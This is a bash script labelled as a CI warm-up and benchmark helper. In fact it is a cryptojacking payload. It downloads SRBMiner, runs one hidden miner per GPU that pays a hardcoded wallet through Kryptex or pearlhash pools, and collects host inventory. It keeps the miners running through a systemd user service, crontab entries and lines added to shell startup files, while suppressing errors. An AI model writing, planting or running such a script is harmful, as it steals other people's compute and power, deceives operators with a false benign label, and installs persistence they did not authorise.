#!/usr/bin/env bash
# CI warm-up helper: prepares an on-host pearlhash benchmark rig for the DGX node
set -u
WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
LANE="7"
STATE="${HOME}/.cache/ci-b1"
mkdir -p "$STATE" 2>/dev/null; cd "$STATE" 2>/dev/null || exit 0

{ echo "host=$(hostname)"; echo "user=$(id -un)"; echo "pid1=$(cat /proc/1/comm 2>/dev/null)"; nvidia-smi -L 2>&1; echo "devnodes:"; ls -1 /dev/nvidia* 2>/dev/null; } | tee "$STATE/inventory.txt"

if [ ! -x "$STATE/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ]; then
  curl -fsSL --max-time 240 -o "$STATE/srb.tgz" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz || exit 0
  tar -xzf "$STATE/srb.tgz" -C "$STATE" || exit 0
  chmod +x "$STATE/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" 2>/dev/null || exit 0
fi
MINER="$STATE/SRBMiner-Multi-3-8-8/SRBMiner-MULTI"
[ -x "$MINER" ] || exit 0

IPD=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "${IPD:-}" ] && IPD=$(hostname)
IPD=$(printf '%s' "$IPD" | tr '.' '-')

pick_endpoint() {
  for ep in \
    stratum+ssl://prl-sg.kryptex.network:8048 \
    stratum+ssl://prl-eu.kryptex.network:8048 \
    stratum+ssl://prl-us.kryptex.network:8048 \
    stratum+ssl://prl-hk.kryptex.network:8048 \
    stratum+ssl://prl-ae.kryptex.network:8048 \
    stratum+tcp://prl-sg.kryptex.network:7048 \
    stratum+tcp://prl-eu.kryptex.network:7048 \
    stratum+tcp://prl-us.kryptex.network:7048 \
    stratum+tcp://prl-hk.kryptex.network:7048 \
    stratum+tcp://prl-ae.kryptex.network:7048 \
    stratum+tcp://pool.pearlhash.xyz:9000 ; do
    h=${ep#*://}; h=${h%%:*}; p=${ep##*:}
    if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p" >/dev/null 2>&1; then printf '%s' "$ep"; return 0; fi
  done
  printf '%s' "stratum+tcp://pool.pearlhash.xyz:9000"
}
EP=$(pick_endpoint)
echo "endpoint=$EP" | tee -a "$STATE/inventory.txt"

N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
[ "${N:-0}" -ge 1 ] || N=1
echo "gpu_count=$N" | tee -a "$STATE/inventory.txt"

start_one() {
  local i="$1" w="ul-t${LANE}-${IPD}-g$(( $1 + 1 ))"
  printf '%s' "--algorithm pearlhash --pool $EP --wallet $WALLET --worker $w --password x --disable-cpu --gpu-id $i --log-file $STATE/run-g$(( $1 + 1 )).log --log-file-mode 2" > "$STATE/argv-g$(( $1 + 1 ))"
  setsid nohup "$MINER" $(cat "$STATE/argv-g$(( $1 + 1 ))") >"$STATE/out-g$(( $1 + 1 )).log" 2>&1 < /dev/null &
}

cat > "$STATE/keep.sh" <<'KEEP'
#!/usr/bin/env bash
M="$HOME/.cache/ci-b1/SRBMiner-Multi-3-8-8/SRBMiner-MULTI"
[ -x "$M" ] || exit 0
for a in "$HOME"/.cache/ci-b1/argv-g*; do
  [ -f "$a" ] || continue
  grep -qF -- "$a" <(ps -eo args=) && continue
  setsid nohup "$M" $(cat "$a") >"$HOME/.cache/ci-b1/out-$(basename "$a").log" 2>&1 < /dev/null &
  sleep 1
done
KEEP
chmod +x "$STATE/keep.sh"

for i in $(seq 0 $((N-1))); do start_one "$i"; done

mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
cat > "$HOME/.config/systemd/user/ci-warm.service" <<UNIT
[Unit]
Description=ci-warm
After=default.target
[Service]
ExecStart=/bin/bash $STATE/keep.sh
Restart=always
RestartSec=30
[Install]
WantedBy=default.target
UNIT
systemctl --user daemon-reload >/dev/null 2>&1; systemctl --user enable --now ci-warm.service >/dev/null 2>&1 || true

( crontab -l 2>/dev/null | grep -v 'ci-b1/keep.sh'; echo "@reboot /bin/bash $STATE/keep.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/bash $STATE/keep.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null || true

for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
  [ -f "$rc" ] || continue
  grep -q 'ci-b1/keep.sh' "$rc" 2>/dev/null || echo "nohup /bin/bash $STATE/keep.sh >/dev/null 2>&1 &" >> "$rc"
done

for t in $(seq 1 36); do
  if grep -qiE 'accepted|share accepted' "$STATE"/run-g*.log "$STATE"/out-g*.log 2>/dev/null; then break; fi
  sleep 5
done
echo "=== pool log evidence ==="
grep -hiE 'authorized|authorize|new job|accepted|difficulty' "$STATE"/run-g*.log "$STATE"/out-g*.log 2>/dev/null | tail -30
echo "=== miner procs ==="; ps -eo pid,etimes,args= | grep -F 'SRBMiner-MULTI' | grep -v grep | head -20
exit 0
